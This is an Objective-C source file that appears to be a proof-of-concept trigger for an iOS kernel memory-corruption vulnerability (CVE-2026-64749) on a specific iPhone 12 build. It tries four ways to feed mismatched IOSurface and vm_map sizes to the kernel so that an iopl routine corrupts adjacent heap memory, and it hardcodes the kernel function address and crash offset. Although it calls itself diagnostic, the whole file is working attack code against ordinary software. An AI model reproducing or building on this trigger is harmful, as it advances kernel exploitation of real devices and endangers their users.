//
//  P019IoplBoundsProbe.m
//  P007OpenOnly
//
//  CVE-2026-64749 on 26.5, start only.
//

#import "P019IoplBoundsProbe.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <sys/sysctl.h>
#import <unistd.h>

// mach_vm.h is #error unsupported on iOS SDK. Declare manually.
extern kern_return_t mach_make_memory_entry_64(
    vm_map_t target_task,
    uint64_t *size,
    uint64_t offset,
    vm_prot_t permission,
    mach_port_t *object_handle,
    mach_port_t parent_entry);

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);
typedef kern_return_t (*IOSurfaceLock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef kern_return_t (*IOSurfaceUnlock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
typedef size_t (*IOSurfaceGetAllocSize_t)(IOSurfaceRef);
typedef size_t (*IOSurfaceGetBytesPerRow_t)(IOSurfaceRef);
typedef size_t (*IOSurfaceGetWidth_t)(IOSurfaceRef);
typedef size_t (*IOSurfaceGetHeight_t)(IOSurfaceRef);
typedef uint32_t (*IOSurfaceGetSeed_t)(IOSurfaceRef);

#ifndef kIOSurfaceLockReadOnly
#define kIOSurfaceLockReadOnly  1
#endif

/* 23F77 iopl panic classification (unslid = live - KernelCache_slide) */
#define P019V2_IOPL_FUNC         0xFFFFFFF009F0377CULL
#define P019V2_IOPL_CORRUPT_OFF  0xC3   /* +195 decimal */
#define P019V2_IOPL_CORRUPT_PC   0xFFFFFFF009F0383FULL

static NSMutableString *p019v2_out;
static int p019v2_fd = -1;

static void p019v2_log(BOOL sync, const char *fmt, ...)
{
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n <= 0)
        return;
    if (n > (int)sizeof(lb) - 1)
        n = (int)sizeof(lb) - 1;
    [p019v2_out appendFormat:@"%.*s\n", n, lb];
    if (p019v2_fd >= 0) {
        write(p019v2_fd, lb, (size_t)n);
        write(p019v2_fd, "\n", 1);
        if (sync)
            fcntl(p019v2_fd, F_FULLFSYNC);
    }
}

static const char *p019v2_kr(kern_return_t r)
{
    unsigned u = (unsigned)r;
    if (r == 0) return "SUCCESS";
    if (u == 0xe00002bc) return "kIOReturnError";
    if (u == 0xe00002c2) return "kIOReturnBadArgument";
    if (u == 0xe00002c7) return "kIOReturnUnsupported";
    if (u == 0xe00002cc) return "kIOReturnCannotLock";
    if (u == 0xe00002d6) return "kIOReturnTimeout";
    if (u == 0xe00002e2) return "kIOReturnNotPermitted";
    return "?";
}

static NSString *p019v2_sysctl(const char *name)
{
    size_t n = 0;
    if (sysctlbyname(name, NULL, &n, NULL, 0) != 0 || n == 0)
        return @"?";
    char *b = calloc(1, n + 1);
    if (!b)
        return @"?";
    sysctlbyname(name, b, &n, NULL, 0);
    NSString *s = [NSString stringWithUTF8String:b];
    free(b);
    return s ?: @"?";
}

/* ── Approach A: IOSurface AllocSize < BPR*Height ──
 *
 * The theory: IOSurfaceCreate takes AllocSize from the dictionary
 * and allocates backing memory of that size. But the MD (memory
 * descriptor) that describes the backing might have its length
 * set from BPR*Height instead of AllocSize.
 *
 * If MD length = BPR*Height > AllocSize = backing size:
 *   IOSurfaceLock → prepare → iopl(MD length) → covers pages beyond backing
 *   On 23F77 (no +195 check): corruption of adjacent kernel heap
 *   On 23G71 (+195 check): rejected with error
 *
 * If IOSurfaceCreate rejects the mismatch, we log that and move on.
 * If it accepts and lock panics, we've triggered 64749.
 * If it accepts and lock succeeds, either:
 *   a) MD length = AllocSize (no mismatch) — kernel is safe
 *   b) MD length = BPR*Height > AllocSize — silent corruption (bad)
 */
static void p019v2_test_a(IOSurfaceCreate_t create,
                          IOSurfaceGetID_t getID,
                          IOSurfaceGetAllocSize_t getAlloc,
                          IOSurfaceGetBytesPerRow_t getBPR,
                          IOSurfaceGetWidth_t getW,
                          IOSurfaceGetHeight_t getH,
                          IOSurfaceLock_t lock,
                          IOSurfaceUnlock_t unlock,
                          IOSurfaceGetBaseAddress_t getBase,
                          IOSurfaceGetSeed_t getSeed)
{
    p019v2_log(YES, "");
    p019v2_log(YES, "═══ Approach A: IOSurface AllocSize < BPR*Height ═══");
    p019v2_log(YES, "Theory: if MD length = BPR*Height but backing = AllocSize,");
    p019v2_log(YES, "iopl covers pages beyond backing → corruption at +195");
    p019v2_log(YES, "");

    const size_t pagesz = 0x4000; /* 16K on A14 */

    struct {
        const char *label;
        size_t alloc_size;
        size_t bpr;
        size_t width;
        size_t height;
        size_t bpe;
    } cases[] = {
        /* Legal baseline — must survive */
        { "legal 16K",         pagesz,       pagesz,       pagesz/4, 1,  4 },

        /* Mismatch: AllocSize < BPR*Height (the 64749 trigger) */
        { "mismatch 16K<32K",  pagesz,       pagesz,       pagesz/4, 2,  4 },
        { "mismatch 16K<64K",  pagesz,       pagesz,       pagesz/4, 4,  4 },
        { "mismatch 16K<128K", pagesz,       pagesz,       pagesz/4, 8,  4 },

        /* Mismatch: BPR > AllocSize with Height=1 */
        { "mismatch bpr 32K",  pagesz,       pagesz*2,     pagesz*2/4, 1, 4 },
        { "mismatch bpr 64K",  pagesz,       pagesz*4,     pagesz*4/4, 1, 4 },

        /* Extreme mismatch */
        { "mismatch 4K<1M",    pagesz/4,     pagesz/4,     pagesz/16, 256, 4 },
        { "mismatch 1K<16K",   1024,         pagesz,       pagesz/4, 1,  4 },

        /* AllocSize = 0 (edge case — kernel might default it) */
        { "mismatch 0<16K",    0,            pagesz,       pagesz/4, 1,  4 },

        /* AllocSize = 1 (sub-page — kernel rounds up backing) */
        { "mismatch 1<16K",    1,            pagesz,       pagesz/4, 1,  4 },
    };
    int n = (int)(sizeof(cases) / sizeof(cases[0]));

    for (int i = 0; i < n; i++) {
        size_t alloc = cases[i].alloc_size;
        size_t bpr   = cases[i].bpr;
        size_t w     = cases[i].width;
        size_t h     = cases[i].height;
        size_t bpe   = cases[i].bpe;
        size_t implied = bpr * h;

        p019v2_log(YES, "─── A[%d] %s ───", i, cases[i].label);
        p019v2_log(YES, "  props: alloc=0x%zx bpr=0x%zx w=%zu h=%zu bpe=%zu",
                   alloc, bpr, w, h, bpe);
        p019v2_log(YES, "  implied BPR*H=0x%zx  alloc=0x%zx  %s",
                   implied, alloc,
                   (implied > alloc) ? "MISMATCH (trigger)" :
                   (implied == alloc) ? "match" : "implied < alloc");

        NSDictionary *props = @{
            @"IOSurfaceWidth": @(w),
            @"IOSurfaceHeight": @(h),
            @"IOSurfaceBytesPerElement": @(bpe),
            @"IOSurfaceBytesPerRow": @(bpr),
            @"IOSurfaceAllocSize": @(alloc),
            @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
        };

        IOSurfaceRef s = create((__bridge CFDictionaryRef)props);
        if (!s) {
            p019v2_log(YES, "  CREATE → NULL (rejected mismatch)");
            continue;
        }

        uint32_t sid = getID ? getID(s) : 0;
        size_t actual_alloc = getAlloc ? getAlloc(s) : 0;
        size_t actual_bpr = getBPR ? getBPR(s) : 0;
        size_t actual_w = getW ? getW(s) : 0;
        size_t actual_h = getH ? getH(s) : 0;
        p019v2_log(YES, "  CREATE → id=0x%x alloc=0x%zx bpr=0x%zx w=%zu h=%zu",
                   sid, actual_alloc, actual_bpr, actual_w, actual_h);

        /* Check if kernel adjusted the properties */
        if (actual_alloc != alloc) {
            p019v2_log(YES, "  NOTE: kernel adjusted alloc 0x%zx → 0x%zx",
                       alloc, actual_alloc);
        }
        if (actual_bpr != bpr) {
            p019v2_log(YES, "  NOTE: kernel adjusted bpr 0x%zx → 0x%zx",
                       bpr, actual_bpr);
        }

        /* LOCK WRITE — this triggers backing prepare → iopl */
        uint32_t seed = 0xaaaaaaaa;
        p019v2_log(YES, "  LOCK write — if panic, check PC for iopl +0x%x",
                   P019V2_IOPL_CORRUPT_OFF);
        fcntl(p019v2_fd, F_FULLFSYNC); /* flush before risky op */

        kern_return_t krw = lock(s, 0, &seed);
        p019v2_log(YES, "  LOCK write kr=0x%08x (%s)", (unsigned)krw, p019v2_kr(krw));

        if (krw == 0) {
            void *base = getBase ? getBase(s) : NULL;
            p019v2_log(YES, "  base=%p  SURVIVED lock — either no mismatch or silent corruption",
                       base);

            /* Write a marker to the first 8 bytes to verify we have access */
            if (base && actual_alloc >= 8) {
                memset(base, 0x41, 8);
                p019v2_log(YES, "  wrote 8 bytes at base — if adjacent kernel heap corrupted,");
                p019v2_log(YES, "  panic may come later (use-after-free or type confusion)");
            }

            uint32_t seed2 = seed;
            kern_return_t ur = unlock(s, 0, &seed2);
            p019v2_log(YES, "  UNLOCK write kr=0x%08x (%s)", (unsigned)ur, p019v2_kr(ur));
        } else {
            p019v2_log(YES, "  LOCK rejected — mismatch caught before iopl (kernel is safe here)");
        }

        /* LOCK READ — might trigger a different iopl path */
        if (krw == 0) {
            seed = 0xaaaaaaaa;
            p019v2_log(YES, "  LOCK read — second iopl path");
            fcntl(p019v2_fd, F_FULLFSYNC);

            kern_return_t krr = lock(s, kIOSurfaceLockReadOnly, &seed);
            p019v2_log(YES, "  LOCK read kr=0x%08x (%s)", (unsigned)krr, p019v2_kr(krr));
            if (krr == 0) {
                unlock(s, kIOSurfaceLockReadOnly, &seed);
            }
        }

        CFRelease(s);
        p019v2_log(YES, "");
    }
}

/* ── Approach B: IOSurface multi-plane total > AllocSize ──
 *
 * Multi-plane IOSurfaces have per-plane offsets and sizes.
 * If the total of all plane sizes > AllocSize, the MD might
 * cover more pages than the backing object.
 */
static void p019v2_test_b(IOSurfaceCreate_t create,
                          IOSurfaceGetID_t getID,
                          IOSurfaceGetAllocSize_t getAlloc,
                          IOSurfaceLock_t lock,
                          IOSurfaceUnlock_t unlock)
{
    p019v2_log(YES, "");
    p019v2_log(YES, "═══ Approach B: IOSurface multi-plane total > AllocSize ═══");
    p019v2_log(YES, "Theory: if MD length = sum of plane sizes but backing = AllocSize,");
    p019v2_log(YES, "iopl covers pages beyond backing → corruption at +195");
    p019v2_log(YES, "");

    const size_t pagesz = 0x4000;

    /* 2-plane NV12-like: luma + chroma
     * Plane 0: offset=0, size=16K
     * Plane 1: offset=16K, size=8K
     * Total = 24K, but AllocSize = 16K → mismatch */
    NSArray *planeInfo = @[
        @{
            @"IOSurfacePlaneWidth": @(4096),
            @"IOSurfacePlaneHeight": @(1),
            @"IOSurfacePlaneBytesPerRow": @(pagesz),
            @"IOSurfacePlaneOffset": @(0),
            @"IOSurfacePlaneSize": @(pagesz),
        },
        @{
            @"IOSurfacePlaneWidth": @(2048),
            @"IOSurfacePlaneHeight": @(1),
            @"IOSurfacePlaneBytesPerRow": @(pagesz / 2),
            @"IOSurfacePlaneOffset": @(pagesz),
            @"IOSurfacePlaneSize": @(pagesz / 2),
        },
    ];

    NSDictionary *props = @{
        @"IOSurfaceWidth": @(4096),
        @"IOSurfaceHeight": @(1),
        @"IOSurfaceBytesPerElement": @(4),
        @"IOSurfaceBytesPerRow": @(pagesz),
        @"IOSurfaceAllocSize": @(pagesz),  /* 16K backing */
        @"IOSurfacePixelFormat": @((unsigned int)'420v'),
        @"IOSurfacePlaneCount": @(2),
        @"IOSurfacePlaneInfo": planeInfo,
    };

    p019v2_log(YES, "  plane0: off=0 size=0x%zx", pagesz);
    p019v2_log(YES, "  plane1: off=0x%zx size=0x%zx", pagesz, pagesz / 2);
    p019v2_log(YES, "  total plane = 0x%zx  alloc = 0x%zx  MISMATCH",
               pagesz + pagesz / 2, pagesz);

    IOSurfaceRef s = create((__bridge CFDictionaryRef)props);
    if (!s) {
        p019v2_log(YES, "  CREATE → NULL (rejected multi-plane mismatch)");
        return;
    }

    uint32_t sid = getID ? getID(s) : 0;
    size_t actual = getAlloc ? getAlloc(s) : 0;
    p019v2_log(YES, "  CREATE → id=0x%x alloc=0x%zx", sid, actual);

    uint32_t seed = 0xaaaaaaaa;
    p019v2_log(YES, "  LOCK write — if panic, check PC for iopl +0x%x",
               P019V2_IOPL_CORRUPT_OFF);
    fcntl(p019v2_fd, F_FULLFSYNC);

    kern_return_t kr = lock(s, 0, &seed);
    p019v2_log(YES, "  LOCK write kr=0x%08x (%s)", (unsigned)kr, p019v2_kr(kr));

    if (kr == 0) {
        p019v2_log(YES, "  SURVIVED — either no mismatch or silent corruption");
        unlock(s, 0, &seed);
    } else {
        p019v2_log(YES, "  LOCK rejected — mismatch caught before iopl");
    }

    CFRelease(s);
    p019v2_log(YES, "");
}

/* ── Approach C: mach_make_memory_entry_64 + vm_map size mismatch ──
 *
 * Create a memory entry for size X, then try to map it with Y > X.
 * If the mapping succeeds, any iopl on the mapping would use Y
 * but the object only has X pages.
 */
static void p019v2_test_c(void)
{
    p019v2_log(YES, "");
    p019v2_log(YES, "═══ Approach C: memory entry + vm_map size mismatch ═══");
    p019v2_log(YES, "Theory: create entry for X, map as Y > X, iopl uses Y");
    p019v2_log(YES, "");

    const size_t pagesz = 0x4000;

    /* Allocate 1 page */
    vm_address_t addr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &addr, pagesz, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS || !addr) {
        p019v2_log(YES, "  vm_allocate FAILED kr=0x%x", (unsigned)kr);
        return;
    }
    memset((void *)addr, 0x42, pagesz);
    p019v2_log(YES, "  source: addr=0x%llx size=0x%zx (1 page)",
               (unsigned long long)addr, pagesz);

    /* Create memory entry for 1 page */
    uint64_t entry_size = pagesz;
    mach_port_t entry = MACH_PORT_NULL;
    kr = mach_make_memory_entry_64(mach_task_self(), &entry_size, (uint64_t)addr,
                                   VM_PROT_READ | VM_PROT_WRITE, &entry, MACH_PORT_NULL);
    p019v2_log(YES, "  make_memory_entry_64 kr=0x%x (%s) esz=0x%llx port=0x%x",
               (unsigned)kr, p019v2_kr(kr), (unsigned long long)entry_size, entry);

    if (kr != KERN_SUCCESS || entry == MACH_PORT_NULL) {
        p019v2_log(YES, "  STOP — no memory entry");
        vm_deallocate(mach_task_self(), addr, pagesz);
        return;
    }

    /* Try to map the entry as 2 pages (larger than the source) */
    vm_address_t map_addr = 0;
    vm_map_t self_map = mach_task_self();
    kr = vm_map(self_map, &map_addr, pagesz * 2, 0, VM_FLAGS_ANYWHERE,
                entry, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
                VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    p019v2_log(YES, "  vm_map 2 pages from 1-page entry kr=0x%x (%s) addr=0x%llx",
               (unsigned)kr, p019v2_kr(kr), (unsigned long long)map_addr);

    if (kr == KERN_SUCCESS && map_addr) {
        p019v2_log(YES, "  MAPPING SUCCEEDED — kernel allowed 2-page map of 1-page object");
        p019v2_log(YES, "  touching second page — if iopl covers it, corruption at +195");
        fcntl(p019v2_fd, F_FULLFSYNC);

        /* Touch the second page — this might trigger iopl on unmapped pages */
        volatile char *p = (volatile char *)(map_addr + pagesz);
        char val = *p;  /* READ — might panic if iopl covers freed/unmapped pages */
        p019v2_log(YES, "  read second page: val=0x%02x — SURVIVED", (unsigned)val);

        /* Try writing to second page */
        *p = 0x43;
        p019v2_log(YES, "  wrote second page — SURVIVED (silent corruption?)");

        vm_deallocate(mach_task_self(), map_addr, pagesz * 2);
    } else {
        p019v2_log(YES, "  vm_map rejected — kernel caught size mismatch");
    }

    /* Also try: map with exactly the entry size, then mlock 2 pages */
    if (entry != MACH_PORT_NULL) {
        map_addr = 0;
        kr = vm_map(self_map, &map_addr, pagesz, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
        if (kr == KERN_SUCCESS && map_addr) {
            p019v2_log(YES, "  1-page map OK at 0x%llx — trying mlock 2 pages",
                       (unsigned long long)map_addr);
            fcntl(p019v2_fd, F_FULLFSYNC);

            int ml = mlock((void *)map_addr, pagesz * 2);
            p019v2_log(YES, "  mlock 2 pages: %d (errno=%d)", ml, errno);
            if (ml == 0) {
                p019v2_log(YES, "  mlock SUCCEEDED on 2 pages of 1-page mapping — iopl may have corrupted");
                munlock((void *)map_addr, pagesz * 2);
            }
            vm_deallocate(mach_task_self(), map_addr, pagesz);
        }
    }

    mach_port_deallocate(mach_task_self(), entry);
    vm_deallocate(mach_task_self(), addr, pagesz);
    p019v2_log(YES, "");
}

/* ── Approach D: IOSurface with AllocSize not page-aligned ──
 *
 * If AllocSize = 4097 (not page-aligned), the kernel might:
 * - Allocate backing = 1 page (16384 on A14)
 * - Set MD length = 4097
 * - iopl for 4097 → covers 1 page → OK (no mismatch)
 *
 * But if the kernel rounds MD length UP to page boundary:
 * - MD length = 16384
 * - backing = 16384
 * - Still OK
 *
 * The interesting case: AllocSize = 16384 + 1 = 16385
 * - backing = 2 pages (32768)
 * - MD length = 16385 or 32768
 * - If MD length = 32768 but backing = 16384 → mismatch
 *
 * This is unlikely but worth testing.
 */
static void p019v2_test_d(IOSurfaceCreate_t create,
                          IOSurfaceGetAllocSize_t getAlloc,
                          IOSurfaceLock_t lock,
                          IOSurfaceUnlock_t unlock)
{
    p019v2_log(YES, "");
    p019v2_log(YES, "═══ Approach D: AllocSize not page-aligned ═══");
    p019v2_log(YES, "");

    const size_t pagesz = 0x4000;
    const size_t cases[] = {
        pagesz + 1,      /* 1 byte over 1 page */
        pagesz * 2 - 1,  /* 1 byte under 2 pages */
        pagesz + 4096,   /* 4K over 1 page (sub-page on 16K system) */
        1,               /* 1 byte */
        4096,            /* 4K (sub-page on 16K system) */
    };
    const char *labels[] = {
        "pagesz+1",
        "2*pagesz-1",
        "pagesz+4K",
        "1",
        "4K",
    };
    int n = (int)(sizeof(cases) / sizeof(cases[0]));

    for (int i = 0; i < n; i++) {
        size_t alloc = cases[i];
        p019v2_log(YES, "─── D[%d] %s (alloc=0x%zx) ───", i, labels[i], alloc);

        NSDictionary *props = @{
            @"IOSurfaceWidth": @(1),
            @"IOSurfaceHeight": @(1),
            @"IOSurfaceBytesPerElement": @(4),
            @"IOSurfaceBytesPerRow": @(alloc > 0 ? alloc : pagesz),
            @"IOSurfaceAllocSize": @(alloc),
            @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
        };

        IOSurfaceRef s = create((__bridge CFDictionaryRef)props);
        if (!s) {
            p019v2_log(YES, "  CREATE → NULL");
            continue;
        }

        size_t actual = getAlloc ? getAlloc(s) : 0;
        p019v2_log(YES, "  CREATE → alloc=0x%zx (requested 0x%zx)", actual, alloc);

        uint32_t seed = 0xaaaaaaaa;
        fcntl(p019v2_fd, F_FULLFSYNC);
        kern_return_t kr = lock(s, 0, &seed);
        p019v2_log(YES, "  LOCK kr=0x%08x (%s)", (unsigned)kr, p019v2_kr(kr));
        if (kr == 0) {
            unlock(s, 0, &seed);
            p019v2_log(YES, "  SURVIVED");
        }
        CFRelease(s);
    }
    p019v2_log(YES, "");
}

@implementation P019IoplBoundsProbe : NSObject

+ (NSString *)runP019IoplBounds
{
    p019v2_out = [NSMutableString string];
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *lp = [docs[0] stringByAppendingPathComponent:@"p019v2_64749_corrupt_log.txt"];
    p019v2_fd = open(lp.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p019v2_log(YES, "time %s", [[[NSDate date] description] UTF8String]);
    p019v2_log(YES, "=== p019v2 session: CVE-2026-64749 iopl corruption test ===");
    p019v2_log(YES, "UNLIKE p019v1: this actually attempts size mismatches");
    p019v2_log(YES, "iopl func (23F77 unslid): 0x%llx", (unsigned long long)P019V2_IOPL_FUNC);
    p019v2_log(YES, "corruption offset: +0x%x (+195 decimal)", P019V2_IOPL_CORRUPT_OFF);
    p019v2_log(YES, "panic PC at ~0x%llx = 64749 triggered",
               (unsigned long long)P019V2_IOPL_CORRUPT_PC);
    p019v2_log(YES, "NOT 65349 (OOB read, +30). NOT KRW. Diagnostic only.");
    p019v2_log(YES, "");

    NSString *machine = p019v2_sysctl("hw.machine");
    NSString *osver = p019v2_sysctl("kern.osversion");
    p019v2_log(YES, "hw.machine=%s kern.osversion=%s",
               machine.UTF8String ?: "?", osver.UTF8String ?: "?");
    BOOL a14 = [machine hasPrefix:@"iPhone13,"];
    BOOL f77 = [osver isEqualToString:@"23F77"];
    if (a14 && f77)
        p019v2_log(YES, "TRACK: iPhone 12 A14 / 26.5 23F77 — intended device.");
    else
        p019v2_log(YES, "TRACK: not 23F77 A14 — log only.");
    p019v2_log(YES, "");

    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) {
        p019v2_log(YES, "STOP dlopen IOSurface");
        goto done;
    }

    IOSurfaceCreate_t pCreate = dlsym(ios, "IOSurfaceCreate");
    IOSurfaceGetID_t pGetID = dlsym(ios, "IOSurfaceGetID");
    IOSurfaceLock_t pLock = dlsym(ios, "IOSurfaceLock");
    IOSurfaceUnlock_t pUnlock = dlsym(ios, "IOSurfaceUnlock");
    IOSurfaceGetBaseAddress_t pBase = dlsym(ios, "IOSurfaceGetBaseAddress");
    IOSurfaceGetAllocSize_t pAlloc = dlsym(ios, "IOSurfaceGetAllocSize");
    IOSurfaceGetBytesPerRow_t pBPR = dlsym(ios, "IOSurfaceGetBytesPerRow");
    IOSurfaceGetWidth_t pW = dlsym(ios, "IOSurfaceGetWidth");
    IOSurfaceGetHeight_t pH = dlsym(ios, "IOSurfaceGetHeight");
    IOSurfaceGetSeed_t pSeed = dlsym(ios, "IOSurfaceGetSeed");

    if (!pCreate || !pLock || !pUnlock) {
        p019v2_log(YES, "STOP dlsym create/lock/unlock");
        goto done;
    }

    p019v2_log(YES, "symbols: create=%p lock=%p unlock=%p getID=%p alloc=%p bpr=%p",
               pCreate, pLock, pUnlock, pGetID, pAlloc, pBPR);

    /* Run all approaches */
    p019v2_test_a(pCreate, pGetID, pAlloc, pBPR, pW, pH,
                  pLock, pUnlock, pBase, pSeed);
    p019v2_test_b(pCreate, pGetID, pAlloc, pLock, pUnlock);
    p019v2_test_c();
    p019v2_test_d(pCreate, pAlloc, pLock, pUnlock);

    /* Summary */
    p019v2_log(YES, "");
    p019v2_log(YES, "═══ SUMMARY ═══");
    p019v2_log(YES, "If any LOCK panicked: check ips PC against iopl 0x%llx + 0x%x",
               (unsigned long long)P019V2_IOPL_FUNC, P019V2_IOPL_CORRUPT_OFF);
    p019v2_log(YES, "If all SURVIVED: mismatch was rejected or MD length = AllocSize");
    p019v2_log(YES, "If CREATE accepted mismatch but LOCK survived:");
    p019v2_log(YES, "  either kernel is safe (MD length = AllocSize)");
    p019v2_log(YES, "  or silent corruption occurred (MD length = BPR*Height > AllocSize)");
    p019v2_log(YES, "  silent corruption would show up as later panic (use-after-free,");
    p019v2_log(YES, "  type confusion, or zone corruption — check subsequent ips)");
    p019v2_log(YES, "");
    p019v2_log(YES, "NOT KRW. Diagnostic only. 64749 ≠ 65349.");

done:
    if (p019v2_fd >= 0) {
        fcntl(p019v2_fd, F_FULLFSYNC);
        close(p019v2_fd);
        p019v2_fd = -1;
    }
    return p019v2_out ?: @"STOP log";
}

@end
